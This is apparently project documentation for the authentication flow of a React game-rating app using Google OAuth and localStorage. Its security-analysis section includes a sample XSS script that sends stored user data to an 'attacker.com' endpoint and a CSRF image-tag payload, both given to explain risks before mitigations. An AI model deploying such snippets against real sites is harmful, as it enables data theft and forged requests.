# Authentication Flow

## Overview

Gamerator uses Google OAuth 2.0 as its sole authentication method. The frontend leverages the `react-google-login` library to handle the OAuth flow, then stores minimal user data (email address) in localStorage for session persistence. All routes except the login page are protected and require authentication.

---

## Authentication Architecture

```
┌──────────────────────────────────────────────────────────────┐
│                    AUTHENTICATION LAYERS                      │
├──────────────────────────────────────────────────────────────┤
│                                                               │
│  Layer 1: Google OAuth (Identity Provider)                   │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  accounts.google.com                                 │    │
│  │  - User authentication                               │    │
│  │  - Email verification                                │    │
│  │  - Token generation                                  │    │
│  └─────────────────────────────────────────────────────┘    │
│                          ↓                                    │
│  Layer 2: Frontend OAuth Integration                          │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  react-google-login                                  │    │
│  │  - OAuth popup/redirect                              │    │
│  │  - Token exchange                                    │    │
│  │  - Profile data extraction                           │    │
│  └─────────────────────────────────────────────────────┘    │
│                          ↓                                    │
│  Layer 3: Session Management                                  │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  localStorage + Context API                          │    │
│  │  - loginState: "true" | "false"                      │    │
│  │  - userId: email | "null"                            │    │
│  │  - UserEmail Context (React)                         │    │
│  └─────────────────────────────────────────────────────┘    │
│                          ↓                                    │
│  Layer 4: Route Protection                                    │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  React Router + Conditional Rendering                │    │
│  │  - Check loginState on every route                   │    │
│  │  - Redirect to "/" if not authenticated              │    │
│  │  - Redirect to "/home" if already authenticated      │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                               │
└──────────────────────────────────────────────────────────────┘
```

---

## Google OAuth Configuration

### Environment Variable
```
REACT_APP_GOOGLEID=<client-id>.apps.googleusercontent.com
```

**Setup Requirements**:
1. Create project in Google Cloud Console
2. Enable Google+ API
3. Configure OAuth consent screen
4. Create OAuth 2.0 Client ID (Web application)
5. Add authorized JavaScript origins (e.g., http://localhost:3000)
6. Add authorized redirect URIs
7. Copy Client ID to .env file

### OAuth Scopes
```javascript
// Default scopes used by react-google-login
scope: "profile email"
```

**Permissions Requested**:
- `profile`: Access to user's basic profile info (name, profile picture)
- `email`: Access to user's email address (primary identifier)

**Not Requested**:
- No calendar access
- No drive access
- No YouTube access
- Minimal permissions (privacy-friendly)

---

## Login Flow (Detailed)

### Step-by-Step Process

**1. User Visits Application**

```javascript
// User navigates to http://localhost:3000

// App.js checks localStorage
const login = localStorage.getItem("loginState")  // null or "false"
const userId = localStorage.getItem("userId")     // null or "null"

// Routes to FrontPage since login !== "true"
<Route path="/" element={<FrontPage />} />
```

**2. FrontPage Renders**

```javascript
// FrontPage.js
import { GoogleLogin } from "react-google-login"

<GoogleLogin
  clientId={process.env.REACT_APP_GOOGLEID}
  buttonText="Sign In with Google"
  onSuccess={responseGoogle}
  onFailure={responseGoogle}
  cookiePolicy={'single_host_origin'}
/>
```

**UI Elements**:
- Gamerator logo
- "Sign In with Google" button (styled by Google)
- Welcome text

**3. User Clicks "Sign In with Google"**

```javascript
// react-google-login triggers popup
window.open('https://accounts.google.com/o/oauth2/auth?...')

// Popup shows:
// - Google account selection
// - Permission consent screen (first time only)
// - "Allow" or "Cancel" buttons
```

**4. User Authorizes Application**

```javascript
// User clicks "Allow" in Google popup

// Google redirects to:
https://localhost:3000?code=<authorization-code>&...

// react-google-login exchanges code for token (automatic)
// Receives OAuth response with:
{
  tokenId: "eyJhbGciOiJSUzI1NiIsImtpZCI6...",
  accessToken: "ya29.a0AfH6SMB...",
  profileObj: {
    googleId: "1234567890",
    imageUrl: "https://lh3.googleusercontent.com/...",
    email: "user@gmail.com",
    name: "John Doe",
    givenName: "John",
    familyName: "Doe"
  },
  tokenObj: { ... }
}
```

**5. Success Callback Fires**

```javascript
// FrontPage.js:17
const responseGoogle = (response) => {
  console.log(response)

  const userEmail = response.profileObj.email

  // Register user in backend
  fetch(`http://${process.env.REACT_APP_HOSTNAME}:8080/user/${userEmail}`, {
    method: "POST",
  })

  // Store session data
  localStorage.setItem("userId", userEmail)
  localStorage.setItem("loginState", "true")

  // Navigate to home
  navigate("/home")
}
```

**What Happens**:
- Extract email from `profileObj.email`
- POST to backend to register user (or acknowledge existing user)
- Store email in localStorage.userId
- Set localStorage.loginState to "true"
- Navigate to /home using React Router

**6. Navigation to /home**

```javascript
// React Router navigates to /home

// App.js re-reads localStorage (not reactive, but route triggers re-render)
const login = localStorage.getItem("loginState")  // "true"

// Conditional rendering in App.js
{login === "true"
  ? (
      <>
        <Header />
        <Navbar />
        <Home />
        <Footer />
      </>
    )
  : <Navigate to="/" replace={true} />
}

// User sees Home page with Navbar
```

**7. Navbar Displays User Email**

```javascript
// Navbar.js:7
const UserContext = useContext(UserEmail)
const loggedinUserEmail = UserContext.userId

// Renders:
<p style={{ margin: "0 10px 0 0" }}>
  Welcome, {loggedinUserEmail}
</p>
```

---

## Authentication State Management

### Storage Mechanisms

**1. localStorage (Persistent)**

```javascript
// Written in FrontPage.js after login
localStorage.setItem("userId", "john.doe@gmail.com")
localStorage.setItem("loginState", "true")

// Read in App.js on every render
const [login, setLogin] = useState(localStorage.getItem("loginState") || "false")
const [userId, setUserId] = useState(localStorage.getItem("userId") || "null")

// Cleared on logout
localStorage.clear()
```

**Pros**:
- Persists across browser sessions
- Survives page refreshes
- Simple API

**Cons**:
- Not secure (accessible to JavaScript)
- No expiration (stays forever until cleared)
- Synchronous API (can block main thread)
- Vulnerable to XSS attacks

**2. React State (App.js)**

```javascript
const [login, setLogin] = useState(localStorage.getItem("loginState") || "false")
const [userId, setUserId] = useState(localStorage.getItem("userId") || "null")
```

**Initialization**:
- Runs once on App.js mount
- Reads from localStorage
- If not found, defaults to "false" and "null"

**Updates**:
- Not directly updated after login (relies on navigation triggering re-mount)
- Could cause stale state issues

**3. Context API (UserEmail)**

```javascript
// App.js
export const UserEmail = createContext()

function App() {
  const [userId, setUserId] = useState(localStorage.getItem("userId") || "null")

  return (
    <UserEmail.Provider value={{ userId, setUserId }}>
      {/* ... routes */}
    </UserEmail.Provider>
  )
}
```

**Consumers**:
- Navbar.js: Display user email
- GameCardPopup.js: Include email in vote submission

**Synchronization**:
- Context initialized from localStorage on mount
- No mechanism to sync context changes back to localStorage
- Potential desync if context updated without localStorage update

---

## Route Protection Implementation

### Protection Pattern in App.js

```javascript
<Route
  path="/home"
  element={
    login === "true"
      ? (
          <>
            <Header />
            <Navbar />
            <Home />
            <Footer />
          </>
        )
      : <Navigate to="/" replace={true} />
  }
/>
```

**Logic**:
- Check `login` state (derived from localStorage)
- If "true": Render protected page with layout components
- If not "true": Redirect to "/" (login page)

**Applied to All Routes Except "/"**:
- /home
- /action
- /adventure
- /indie
- /shooter
- /rpg
- /leaderboard

### Reverse Protection (Login Page)

```javascript
<Route
  path="/"
  element={
    login === "true"
      ? <Navigate to="/home" replace={true} />
      : <FrontPage />
  }
/>
```

**Logic**:
- If already logged in: Redirect to /home
- If not logged in: Show login page

**Purpose**:
- Prevent logged-in users from seeing login page
- Improves UX (no unnecessary login prompt)

---

## Logout Flow

### Step-by-Step Process

**1. User Clicks Logout**

```javascript
// Navbar.js:12
<Link
  to="/"
  style={{ textDecoration: "none" }}
  className="navLink"
  onClick={logout}
>
  <li>Logout</li>
</Link>
```

**2. Logout Handler Fires**

```javascript
// Navbar.js:19
const logout = () => {
  localStorage.clear()  // Clear all localStorage data
  navigate("/")         // Navigate to login page
  window.location.reload()  // Force full page reload
}
```

**Why window.location.reload()?**
- React state (App.js login, userId) is stale
- Context state (UserEmail) is stale
- Reload forces App.js to re-mount and re-read localStorage
- Clears all component state

**Consequence**:
- Full page reload (loses SPA feel)
- All network requests aborted
- Brief white screen during reload

**3. App.js Re-initializes**

```javascript
// After reload, App.js runs from scratch
const [login, setLogin] = useState(localStorage.getItem("loginState"))  // null
const [userId, setUserId] = useState(localStorage.getItem("userId"))    // null

// login is now falsy
// Route protection redirects all protected routes to "/"
// User sees FrontPage
```

**4. User Sees Login Page**

```javascript
// FrontPage renders
// User can log in again (same or different Google account)
```

---

## Security Analysis

### Current Security Posture

**Strengths**:
1. **Google OAuth**: Delegates authentication to trusted provider
2. **No Passwords**: No password storage or management burden
3. **Email Verification**: Google-verified emails only
4. **XSS Protection**: React auto-escapes rendered content
5. **HTTPS in Production**: Heroku/Netlify provide HTTPS

**Weaknesses**:
1. **localStorage Exposure**: User email stored in plain text
2. **No Token Storage**: OAuth token not stored (good) but also not used (missed opportunity)
3. **No Expiration**: Login persists forever (no timeout)
4. **No CSRF Protection**: Backend API has no CSRF tokens
5. **Client-Side Only**: No server-side session validation
6. **Email in URL**: Backend API uses email in URL path (logged in access logs)
7. **No Rate Limiting**: No protection against brute force
8. **XSS Vulnerability**: If malicious script injected, can read localStorage

### Attack Vectors

**1. XSS (Cross-Site Scripting)**

```javascript
// Attacker injects malicious script (e.g., via compromised dependency)
<script>
  const email = localStorage.getItem('userId')
  const token = localStorage.getItem('loginState')
  // Send to attacker's server
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ email, token })
  })
</script>
```

**Impact**: Attacker gains user's email and login state

**Mitigation**:
- Use httpOnly cookies (requires backend changes)
- Implement Content Security Policy (CSP)
- Regular dependency audits (npm audit)
- Avoid `dangerouslySetInnerHTML`

**2. CSRF (Cross-Site Request Forgery)**

```html
<!-- Attacker's website -->
<img src="http://gamerator-api.com:8080/123/5" />
```

**Impact**: Attacker can trigger vote submission if user is logged in

**Mitigation**:
- Implement CSRF tokens
- Use SameSite cookies
- Require custom headers (e.g., X-Requested-With)

**3. Session Hijacking**

```javascript
// Attacker gains access to user's browser/localStorage
const email = localStorage.getItem('userId')

// Attacker can now:
// 1. Vote as the user
// 2. Browse as the user
// 3. No way to detect or revoke access
```

**Impact**: Full account takeover (no session invalidation mechanism)

**Mitigation**:
- Implement session tokens with expiration
- Backend session management
- Logout on all devices feature

---

## Best Practices Comparison

### Current Implementation vs Industry Standards

| Feature | Current | Industry Standard | Risk Level |
|---------|---------|-------------------|------------|
| **Identity Provider** | Google OAuth | ✓ OAuth 2.0 / OIDC | ✅ Low |
| **Token Storage** | Not stored | httpOnly cookies or secure storage | ⚠️ Medium |
| **Session Expiration** | Never | 15-60 minutes idle, 7-30 days absolute | 🔴 High |
| **Refresh Tokens** | None | Refresh token rotation | 🔴 High |
| **CSRF Protection** | None | CSRF tokens or SameSite cookies | 🔴 High |
| **XSS Protection** | React escaping only | CSP headers + React escaping | ⚠️ Medium |
| **HTTPS** | Production only | Always (HSTS) | ⚠️ Medium |
| **Logout** | localStorage.clear() | Backend session invalidation | 🔴 High |
| **Multi-Device** | Shared localStorage (impossible) | Server-side session management | 🔴 High |

---

## Recommended Improvements

### Short-Term (High Impact, Low Effort)

**1. Add Session Expiration**

```javascript
// FrontPage.js - Add expiration timestamp
const expirationTime = Date.now() + (24 * 60 * 60 * 1000)  // 24 hours
localStorage.setItem("loginExpiration", expirationTime)

// App.js - Check expiration on mount
const isSessionValid = () => {
  const expiration = localStorage.getItem("loginExpiration")
  if (!expiration) return false
  return Date.now() < parseInt(expiration)
}

const [login, setLogin] = useState(
  isSessionValid() ? localStorage.getItem("loginState") : "false"
)

// If expired, clear localStorage
useEffect(() => {
  if (!isSessionValid()) {
    localStorage.clear()
    navigate("/")
  }
}, [])
```

**2. Implement Content Security Policy**

```html
<!-- public/index.html -->
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self';
           script-src 'self' https://accounts.google.com;
           style-src 'self' 'unsafe-inline';
           img-src 'self' data: https:;
           connect-src 'self' http://localhost:8080 https://*.herokuapp.com;">
```

**3. Use Environment Variable for API URL**

```javascript
// Instead of:
fetch(`http://${process.env.REACT_APP_HOSTNAME}:8080/...`)

// Use:
const API_BASE_URL = process.env.REACT_APP_API_URL || 'http://localhost:8080'
fetch(`${API_BASE_URL}/...`)
```

### Long-Term (Production-Ready)

**1. Backend Session Management**

```javascript
// Frontend stores session token (not user data)
localStorage.setItem("sessionToken", token)

// All API requests include token
fetch(url, {
  headers: {
    'Authorization': `Bearer ${token}`
  }
})

// Backend validates token on every request
// Backend tracks session expiration
// Backend can revoke sessions
```

**2. Use JWT with Refresh Tokens**

```javascript
// Store in httpOnly cookies (backend sets)
// Set-Cookie: accessToken=<jwt>; HttpOnly; Secure; SameSite=Strict
// Set-Cookie: refreshToken=<jwt>; HttpOnly; Secure; SameSite=Strict

// Frontend doesn't access tokens directly
// Browser automatically sends cookies with requests

// When access token expires (15 min):
// Backend automatically uses refresh token to issue new access token
// Refresh token rotates on each use (security)
```

**3. Multi-Factor Authentication (Optional)**

```javascript
// After Google OAuth:
// 1. Send 6-digit code to user's email/phone
// 2. User enters code on verification page
// 3. Only then set loginState to "true"

// Prevents account takeover even if Google account compromised
```

---

## Testing Authentication

### Manual Testing Checklist

**Login Flow**:
- [ ] Clicking "Sign In with Google" opens popup
- [ ] Entering valid Google credentials logs in
- [ ] User is redirected to /home after login
- [ ] Email is displayed in Navbar
- [ ] Refreshing /home keeps user logged in
- [ ] Navigating to protected routes works

**Logout Flow**:
- [ ] Clicking "Logout" redirects to login page
- [ ] localStorage is cleared
- [ ] Accessing protected routes redirects to login
- [ ] Previous user email is not displayed

**Session Persistence**:
- [ ] Closing and reopening browser keeps user logged in
- [ ] Login persists across different tabs
- [ ] Login persists after computer restart

**Error Handling**:
- [ ] Canceling Google OAuth shows appropriate message
- [ ] Denying permissions shows appropriate message
- [ ] Network error during POST /user shows appropriate message

### Automated Testing (Recommended)

**Unit Tests (FrontPage.js)**:
```javascript
import { render, screen, waitFor } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import FrontPage from './FrontPage'

test('renders Google login button', () => {
  render(<FrontPage />)
  expect(screen.getByText('Sign In with Google')).toBeInTheDocument()
})

test('stores user data on successful login', async () => {
  const mockResponse = {
    profileObj: { email: 'test@example.com' }
  }

  // Mock react-google-login
  // Trigger success callback
  // Assert localStorage.setItem called with correct values
})
```

**Integration Tests (Login Flow)**:
```javascript
import { render, screen } from '@testing-library/react'
import { MemoryRouter } from 'react-router-dom'
import App from './App'

test('redirects to home after login', async () => {
  // Mock Google OAuth success
  // Simulate login
  // Assert navigation to /home
  // Assert email displayed in Navbar
})

test('protects routes when not logged in', () => {
  render(
    <MemoryRouter initialEntries={['/action']}>
      <App />
    </MemoryRouter>
  )
  // Assert redirected to "/" (login page)
})
```

**E2E Tests (Cypress/Playwright)**:
```javascript
describe('Authentication', () => {
  it('logs in with Google', () => {
    cy.visit('/')
    cy.contains('Sign In with Google').click()
    // Handle Google OAuth popup (requires stubbing)
    cy.url().should('include', '/home')
    cy.contains('Welcome, test@example.com')
  })

  it('persists session after refresh', () => {
    // Login first
    cy.visit('/home')
    cy.reload()
    cy.url().should('include', '/home')
  })

  it('logs out successfully', () => {
    // Login first
    cy.visit('/home')
    cy.contains('Logout').click()
    cy.url().should('equal', 'http://localhost:3000/')
  })
})
```

---

## Troubleshooting Common Issues

### Issue 1: "Sign In with Google" Button Not Rendering

**Symptoms**:
- Button doesn't appear
- Console error: "Invalid client ID"

**Causes**:
- `REACT_APP_GOOGLEID` not set or incorrect
- Environment variable not prefixed with `REACT_APP_`
- .env file not in project root

**Solutions**:
```bash
# Check environment variable
echo $REACT_APP_GOOGLEID

# Ensure .env file exists
cat .env

# Restart dev server (env vars loaded on startup)
npm start
```

### Issue 2: OAuth Popup Blocked

**Symptoms**:
- Popup doesn't open
- Browser shows "Popup blocked" notification

**Causes**:
- Browser popup blocker
- User disabled popups

**Solutions**:
```javascript
// Use redirect flow instead of popup
<GoogleLogin
  clientId={process.env.REACT_APP_GOOGLEID}
  buttonText="Sign In with Google"
  onSuccess={responseGoogle}
  onFailure={responseGoogle}
  uxMode="redirect"  // Use redirect instead of popup
  redirectUri={window.location.origin}
/>
```

### Issue 3: "Unauthorized" Error from Backend

**Symptoms**:
- POST /user/{email} returns 401 or 403
- User stuck on login page

**Causes**:
- Backend not running
- CORS misconfigured
- Email format issue

**Solutions**:
```javascript
// Add error handling
fetch(`http://${...}/user/${userEmail}`, { method: "POST" })
  .then(res => {
    if (!res.ok) {
      throw new Error(`HTTP ${res.status}: ${res.statusText}`)
    }
    return res.json()
  })
  .catch(error => {
    console.error('Failed to register user:', error)
    alert('Login failed. Please try again.')
  })
```

### Issue 4: User Logged Out After Refresh

**Symptoms**:
- User logs in successfully
- Refreshing page logs user out

**Causes**:
- localStorage not persisting (browser settings)
- localStorage.clear() called unexpectedly
- Incognito mode (localStorage cleared on tab close)

**Solutions**:
```javascript
// Debug localStorage
console.log('loginState:', localStorage.getItem('loginState'))
console.log('userId:', localStorage.getItem('userId'))

// Check if localStorage is available
if (typeof(Storage) === "undefined") {
  alert("Your browser doesn't support localStorage. Please use a modern browser.")
}
```

### Issue 5: Context Showing Stale User Email

**Symptoms**:
- Navbar shows old email after login
- GameCardPopup uses wrong email for voting

**Causes**:
- Context not updated after login
- useState not reactive to localStorage changes

**Solutions**:
```javascript
// In FrontPage.js, update Context after login
const UserContext = useContext(UserEmail)

const responseGoogle = (response) => {
  const userEmail = response.profileObj.email

  fetch(`http://${...}/user/${userEmail}`, { method: "POST" })

  localStorage.setItem("userId", userEmail)
  localStorage.setItem("loginState", "true")

  // Update Context
  UserContext.setUserId(userEmail)

  navigate("/home")
}
```

---

## Future Authentication Enhancements

### Phase 1: Improve Current System
1. Add session expiration (24 hours)
2. Implement "Remember Me" checkbox (30 days vs 24 hours)
3. Add loading state during OAuth
4. Better error messages for OAuth failures
5. Graceful handling of network errors

### Phase 2: Backend Session Management
1. Generate session tokens on backend
2. Store sessions in Redis or database
3. Validate tokens on every API request
4. Implement token refresh mechanism
5. Add logout endpoint (server-side session termination)

### Phase 3: Advanced Features
1. Multi-factor authentication
2. Social login (Facebook, Twitter, GitHub)
3. Email/password as backup authentication
4. "Login with Apple" (privacy-focused)
5. Account settings page (view sessions, logout all devices)

### Phase 4: Enterprise Features
1. Single Sign-On (SSO) via SAML/OIDC
2. Role-based access control (admin, moderator, user)
3. Audit logs (login history, IP addresses)
4. Anomaly detection (suspicious login patterns)
5. OAuth scope management (fine-grained permissions)

---

## Conclusion

Gamerator's authentication system effectively demonstrates OAuth integration in a React application. The use of Google OAuth provides a secure, user-friendly authentication experience without the burden of password management. However, the current implementation lacks production-ready features like session expiration, token management, and multi-device support.

**Current State**: Educational, functional, simple
**Production-Ready State**: Requires backend session management, token security, and advanced error handling

For a learning project, the current approach is excellent. For a production application serving real users, implementing the recommended improvements is essential to protect user data and prevent unauthorized access.
